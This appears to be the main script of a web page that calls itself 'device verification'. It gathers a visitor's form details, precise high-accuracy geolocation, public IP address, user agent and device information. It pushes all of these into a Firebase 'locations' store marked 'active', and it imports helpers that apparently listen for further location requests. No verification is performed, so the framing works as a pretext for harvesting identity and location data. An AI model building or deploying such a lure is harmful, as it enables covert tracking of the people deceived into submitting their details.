import { initializeTheme } from './src/features/theme/theme-manager.js';
import { listenForLocationRequests, setupUnloadHandler } from './src/features/location/location-tracker.js';
import { getDeviceInfo } from './src/utils/browser-detection.js';
import { 
    createFormFields, 
    initializeFormValidation, 
    getFormData 
} from './src/features/form/form-handler.js';

// Helper function to handle geolocation errors
function getGeolocationErrorMessage(error) {
    switch(error.code) {
        case error.PERMISSION_DENIED:
            return "Location access was denied. Please allow location access to verify your device.";
        case error.POSITION_UNAVAILABLE:
            return "Location information is unavailable. Please try again.";
        case error.TIMEOUT:
            return "Location request timed out. Please try again.";
        default:
            return "An error occurred while getting location. Please try again.";
    }
}

// Initialize Firebase and load theme
document.addEventListener('DOMContentLoaded', async () => {
    try {
        // Initialize theme system
        await initializeTheme();

        // Setup location request listener
        listenForLocationRequests();

        // Setup unload handler
        setupUnloadHandler();

        // Initialize form
        const formContainer = document.getElementById('userDetailsForm');
        if (formContainer) {
            formContainer.appendChild(createFormFields());
            initializeFormValidation();
        }

        // Setup verify button click handler
        const verifyButton = document.getElementById('allowLocation');
        const locationStatus = document.getElementById('locationStatus');

        if (!verifyButton) {
            console.error('Verify button not found');
            return;
        }

        console.log('Setting up click handler for verify button');
        verifyButton.addEventListener('click', async () => {
            console.log('Verify button clicked');
            try {
                // Get user details first
                const userDetails = getFormData();
                if (!userDetails) {
                    throw new Error('Please fill in all required fields correctly');
                }

                if (!navigator.geolocation) {
                    throw new Error('Geolocation is not supported by this browser');
                }

                verifyButton.disabled = true;
                document.querySelector('.container').classList.add('processing');
                locationStatus.textContent = 'Verifying device...';

                // Get initial location
                console.log('Requesting location...');
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(
                        (pos) => {
                            console.log('Location received successfully');
                            resolve(pos);
                        },
                        (err) => {
                            console.error('Geolocation error:', err);
                            reject(new Error(getGeolocationErrorMessage(err)));
                        },
                        {
                            enableHighAccuracy: true,
                            timeout: 20000,
                            maximumAge: 0
                        }
                    );
                });

                // Get IP address
                console.log('Fetching IP address...');
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                if (!ipResponse.ok) {
                    throw new Error('Failed to fetch IP address');
                }
                const { ip } = await ipResponse.json();
                console.log('IP address received:', ip);

                // Save location to Firebase
                console.log('Saving to Firebase...');
                if (!window.database) {
                    throw new Error('Firebase database not initialized');
                }

                const locationsRef = window.database.ref('locations');
                const newLocationRef = locationsRef.push();

                const locationData = {
                    ...userDetails, // Add user details
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    altitude: position.coords.altitude,
                    altitudeAccuracy: position.coords.altitudeAccuracy,
                    timestamp: new Date().toISOString(),
                    status: 'active',
                    ip: ip,
                    userAgent: navigator.userAgent,
                    ...getDeviceInfo()
                };

                await newLocationRef.set(locationData);
                console.log('Location saved successfully');

                locationStatus.textContent = 'Device verified successfully';
                verifyButton.style.display = 'none'; // Hide button after success
                
                // Add success animation class
                document.querySelector('.thank-you-card').classList.add('success');
                
            } catch (error) {
                console.error('Verification failed:', error);
                locationStatus.textContent = error.message || 'Verification failed. Please try again.';
                locationStatus.style.color = '#DA1710'; // Show error in red
                verifyButton.disabled = false;
                document.querySelector('.container').classList.remove('processing');
            }
        });

        console.log('Initialization complete');

    } catch (error) {
        console.error('Failed to initialize:', error);
    }
});
